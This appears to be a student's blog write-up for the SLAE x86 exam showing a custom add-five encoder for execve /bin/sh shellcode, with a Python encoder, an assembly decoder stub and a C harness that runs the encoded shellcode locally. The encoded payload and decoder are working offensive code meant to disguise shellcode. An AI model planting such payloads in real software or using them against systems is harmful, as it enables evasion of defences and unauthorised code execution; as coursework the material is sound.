---
layout: post
title:  "SLAE x86 Exam - Assignment 4"
categories: certs slae 
---


## Assignment #4 - Custom encoder
_Student ID: **PA-7854**_

The assignment indications are as follows:
* Create a custom encoding scheme like the _Insertion encoder_
* Write PoC using execve-stack as shellcode 


The code is available at [my github repo](https://github.com/0xKiewicz/SLAE)
Let's first define how to encode. Since there is no `0x5` in shellcode, we can use it, so we add `0x5` to each byte to encode the shellcode.  

We will need to write a simple Python encoder which gets as input the `execve-stack` program, it simply executes `/bin/sh` by using the stack (instead of jmp-call-pop technique).

#### Encoder
First, we get the formatted shellcode of the `execve-stack` program:
```bash
$ for i in $(objdump -d -M intel execve-stack | grep "^ " | cut -f2); do echo -ne $i','; done
31,c0,50,68,2f,2f,73,68,68,2f,62,69,6e,89,e3,50,89,e2,53,89,e1,b0,0b,cd,80,
```

Now we build the Python decoder
```python
#!/usr/bin/env python
# Simple encoder for the SLAE x86 exam
# Adds 5 to each byte
# @_Kiewicz
shellcode = ("31,c0,50,68,2f,2f,73,68,68,2f,62,69,6e,89,e3,50,89,e2,53,89,e1,b0,0b,cd,80").split(',')

one = ""
two = ""
print('Encoding...')

# Convert to int base 16 
for i in shellcode:
        j = int(i, 16) + 5
	one += '\\x'
	one += '%02x' % j

	two += '0x'
	two += '%02x,' % j


print(one)
print('\n')
print(two)

print('\nLength: %d' % len(shellcode))
```

This is the resulting shellcode:
```bash
$ python encoder.py 
Encoding...
\x36\xc5\x55\x6d\x34\x34\x78\x6d\x6d\x34\x67\x6e\x73\x8e\xe8\x55\x8e\xe7\x58\x8e\xe6\xb5\x10\xd2\x85


0x36,0xc5,0x55,0x6d,0x34,0x34,0x78,0x6d,0x6d,0x34,0x67,0x6e,0x73,0x8e,0xe8,0x55,0x8e,0xe7,0x58,0x8e,0xe6,0xb5,0x10,0xd2,0x85,

Length: 25
```
Moving forward! We need to create the decoder in Assembly, just by reverting the same action, which means to substract by 5 each byte:

```nasm
decoder:
	pop esi			; Save shellcode in ESI	
	xor ecx, ecx		; clear out counter
	mov cl, 0x19		; set counter to shellcode length
	xor ebx, ebx		
	mov bl, 0x5		; decode with 5
	xor eax, eax		

decode:
	mov al, byte [esi]	; point to shellcode
	sub al, bl		; substract 5
	mov byte [esi], al	; overwrite in shellcode
	inc esi			; move forward to next byte
	loop decode		; loop until going through the whole shellcode
	jmp short shellcode 	; execute it

```
We copy the resulting shellcode into `shellcode.c`, compile and run, and we get a shell:

shellcode.c
```c
unsigned char code[] = "\xeb\x16\x5e\x31\xc9\xb1\x19\x31\xdb\xb3\x05\x31\xc0\x8a\x06\x28\xd8\x88\x06\x46\xe2\xf7\xeb\x05\xe8\xe5\xff\xff\xff\x36\xc5\x55\x6d\x34\x34\x78\x6d\x6d\x34\x67\x6e\x73\x8e\xe8\x55\x8e\xe7\x58\x8e\xe6\xb5\x10\xd2\x85";
```

```bash
$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
$ ./shellcode 
Shellcode Length:  54
sh-4.4$ 

```


Done for today, this was an easy task.
